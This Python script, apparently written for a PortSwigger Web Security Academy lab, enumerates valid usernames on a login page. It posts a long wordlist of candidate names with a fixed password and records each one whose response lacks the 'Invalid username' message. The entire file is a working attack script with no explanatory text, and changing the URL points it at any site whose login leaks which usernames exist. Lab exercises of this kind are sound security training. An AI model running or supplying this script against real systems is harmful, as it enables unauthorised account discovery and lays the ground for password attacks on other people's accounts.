#!/usr/bin/env python3
import requests
import string
import time

# Target URL
url = 'https://0ab500da0459256c818d3e530055005d.web-security-academy.net/login'

usernames = ["carlos","root","admin","test","guest","info","adm","mysql","user","administrator","oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico","acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit","admin","administracion","administrador","administrator","administrators","admins","ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda","agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts","alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce","announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple","application","applications","apps","appserver","aq","ar","archie","arcsight","argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at","athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover"]

password = '1';

realUsernames=[]

for username in usernames:

    data = {
        'username': username,
        'password': password
            }

    # Send POST request with FORM data using the data parameter
    response = requests.post(url, data=data)

    # Print the response
    #print(response.text)

    if 'Invalid username' not in response.text:
        print(f"Username Found!: {username}")
        realUsernames.append(username)
    else:
        print(f"Username Not Found: {username}")

print(f"List of usernames that are real: \n{realUsernames}")
